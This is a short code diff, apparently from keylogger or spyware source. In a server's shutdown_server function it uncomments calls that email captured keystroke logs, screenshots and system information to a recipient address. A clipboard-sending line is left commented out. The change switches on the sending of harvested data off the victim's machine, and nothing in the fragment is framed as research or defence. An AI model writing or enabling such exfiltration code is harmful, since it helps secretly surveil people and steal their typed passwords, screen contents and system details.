@@ -190,10 +190,10 @@ def stream():
 # Handle graceful shutdown and send logs on shutdown
 def shutdown_server():
     print("Shutting down server and sending logs...")
-    # send_email(keys_information, file_merge + keys_information, toaddr)
-    # send_email(screenshot_information, file_merge + screenshot_information, toaddr)
-    # #send_email(clipboard_information, file_merge + clipboard_information, toaddr)
-    # send_email(system_information, file_merge + system_information, toaddr)
+    send_email(keys_information, file_merge + keys_information, toaddr)
+    send_email(screenshot_information, file_merge + screenshot_information, toaddr)
+    #send_email(clipboard_information, file_merge + clipboard_information, toaddr)
+    send_email(system_information, file_merge + system_information, toaddr)
     sys.exit(0)
 
 
